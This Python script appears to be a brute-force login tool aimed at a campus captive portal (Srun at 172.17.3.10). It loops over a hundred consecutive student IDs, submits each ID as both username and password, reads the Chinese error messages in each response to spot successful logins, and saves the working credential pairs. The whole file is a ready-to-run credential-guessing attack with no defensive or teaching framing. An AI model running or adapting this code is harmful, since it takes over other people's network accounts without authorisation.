
import urllib
import requests



def baolipojie(username,password):
    #conn = httplib.HTTPConnection("http://172.17.3.10/srun_portal_pc.php?ac_id=1&")
    headers={'Host':'172.17.3.10',
                'Connection':'keep-alive',
                'Content-Length':'102',
                'Cache-Control':'max-age=0',
                'Upgrade-Insecure-Requests':'1',
                'Origin':'http://172.17.3.10',
                'Content-Type':'application/x-www-form-urlencoded',
                'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36 Edg/85.0.564.51',
                'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Accept-Encoding':'gzip, deflate',
                'Accept-Language':'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6'}
    values={'action':'login',
            'ac_id':'1',
            'drop':'0',
            #'domain':'%40liantong',
            'username': username,
            'password': password}
    data=urllib.parse.urlencode(values)
    resp=requests.post("http://172.17.3.10/srun_portal_pc.php",data=values,headers=headers)
    j=resp.text.find('密码错误')
    k=resp.text.find('欠费')
    m=resp.text.find('用完')
    l=resp.text.find('用户不存在')
    if j!=2835 and k!=2834 and m!=2814 and l!=2832:
        print("成功"+str(username))
        b.append((username,password))
        return


b=[]
print("请输入起始学号，自动尝试后一百位")
rag1=int(input())
for i in range(rag1,rag1+100):
    baolipojie(i,i)

print(b)#步骤二
input()